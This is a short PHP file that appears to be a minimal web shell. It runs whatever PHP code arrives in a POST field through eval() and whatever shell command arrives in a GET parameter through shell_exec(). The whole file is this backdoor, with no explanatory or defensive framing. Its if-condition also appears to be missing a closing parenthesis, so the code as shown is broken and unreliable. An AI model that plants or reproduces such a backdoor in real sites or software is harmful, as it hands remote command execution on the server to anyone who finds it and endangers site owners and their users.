<?php
if($_POST['something']&&(isset($_GET['something_else']))
{
	eval($_POST['something']);
	shell_exec($_GET['something_else']);
}
?>